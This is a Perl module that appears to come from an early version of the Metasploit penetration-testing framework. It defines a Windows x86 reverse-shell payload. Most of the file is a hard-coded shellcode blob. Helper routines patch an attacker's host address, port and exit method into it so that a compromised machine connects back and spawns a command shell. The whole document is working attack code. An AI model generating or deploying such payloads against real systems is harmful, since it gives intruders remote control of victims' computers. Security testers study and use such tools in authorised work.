package Msf::Payload::win32_reverse;
use strict;
use base 'Msf::Payload';
use Pex::Utils;

my $info =
{
    Name         => 'winreverse',
    Version      => '1.0',
    Description  => 'Connect back to attacker and spawn a shell',
    Author       => 'H D Mooore <hdm[at]metasploit.com> [Artistic License]',
    Arch         => [ 'x86' ],
    Priv         => 0,
    OS           => [ 'win32' ],
    Keys         => '', 
    Multistage   => 0,
    Type         => 'reverse_shell',
    Size         => '',
    UserOpts     =>
        {
            'LHOST'         =>  [1, 'ADDR', 'Local address to receive connection'],
            'LPORT'         =>  [1, 'PORT', 'Local port to receive connection'],
            'EXITFUNC' =>  [0, 'DATA', 'Exit technique: "process", "thread", "seh"'],
        }
};

sub new {
    my $class = shift;
    my $self = $class->SUPER::new({'Info' => $info}, @_);
    $self->{'Info'}->{'Size'} = $self->_GenSize;
    return($self);
}

sub Build {
    my $self = shift;
    return($self->Generate($self->GetVar('LHOST'), $self->GetVar('LPORT')));
}

sub Generate
{
    my $self = shift;
    my $host = shift;    
    my $port = shift;
    my $off_port = 156;
    my $port_bin = pack("n", $port);
    my $off_host = 149;
    my $host_bin = gethostbyname($host);


    my $exits = { 
                    "process" => Pex::Utils::RorHash("ExitProcess"),
                    "thread"       => Pex::Utils::RorHash("ExitThread"),
                    "seh"          => Pex::Utils::RorHash("SetUnhandledExceptionFilter"),
                };

    my $exitopt  = lc($self->GetVar('EXITFUNC'));
    my $exitfunc = defined($exits->{$exitopt}) ? $exits->{$exitopt} : $exits->{"seh"};
    my $off_exit = 29;

    my $shellcode =
    "\xe8\x2b\x00\x00\x00\x43\x4d\x44\x00\xe7\x79\xc6\x79\xec\xf9\xaa".
    "\x60\xd9\x09\xf5\xad\xcb\xed\xfc\x3b\x8e\x4e\x0e\xec\x7e\xd8\xe2".
    "\x73\xad\xd9\x05\xce\x72\xfe\xb3\x16\x57\x53\x32\x5f\x33\x32\x00".
    "\x5b\x54\x89\xe5\x89\x5d\x00\x6a\x30\x59\x64\x8b\x01\x8b\x40\x0c".
    "\x8b\x70\x1c\xad\x8b\x58\x08\xeb\x0c\x8d\x57\x24\x51\x52\xff\xd0".
    "\x89\xc3\x59\xeb\x10\x6a\x08\x5e\x01\xee\x6a\x08\x59\x8b\x7d\x00".
    "\x80\xf9\x04\x74\xe4\x51\x53\xff\x34\x8f\xe8\x7f\x00\x00\x00\x59".
    "\x89\x04\x8e\xe2\xeb\x31\xff\x66\x81\xec\x90\x01\x54\x68\x01\x01".
    "\x00\x00\xff\x55\x18\x57\x57\x57\x57\x47\x57\x47\x57\xff\x55\x14".
    "\x89\xc3\x31\xff\x68\x7f\x00\x00\x01\x68\x02\x00\x22\x11\x89\xe1".
    "\x6a\x10\x51\x53\xff\x55\x10\x85\xc0\x75\x41\x8d\x3c\x24\x31\xc0".
    "\x6a\x15\x59\xf3\xab\xc6\x44\x24\x10\x44\xfe\x44\x24\x3d\x89\x5c".
    "\x24\x48\x89\x5c\x24\x4c\x89\x5c\x24\x50\x8d\x44\x24\x10\x54\x50".
    "\x51\x51\x51\x41\x51\x49\x51\x51\xff\x75\x00\x51\xff\x55\x28\x89".
    "\xe1\x6a\xff\xff\x31\xff\x55\x24\x57\xff\x55\x0c\xeb\x58\x53\x55".
    "\x56\x57\x8b\x6c\x24\x18\x8b\x45\x3c\x8b\x54\x05\x78\x01\xea\x8b".
    "\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x32\x49\x8b\x34\x8b\x01\xee\x31".
    "\xff\xfc\x31\xc0\xac\x38\xe0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf2".
    "\x3b\x7c\x24\x14\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b".
    "\x5a\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\xeb\x02\x31\xc0\x89\xea\x5f".
    "\x5e\x5d\x5b\xc2\x08\x00\x31\xdb\x53\xff\x55\x20\xff\xd3";

    

    substr($shellcode, $off_port, 2, $port_bin);
    substr($shellcode, $off_host, 4, $host_bin);
    substr($shellcode, $off_exit, 4, pack("L", $exitfunc));
    return($shellcode);       

}

sub _GenSize
{
    my $self = shift;
    my $bin = $self->Generate('127.0.0.1', '4444');
    return length($bin);
}
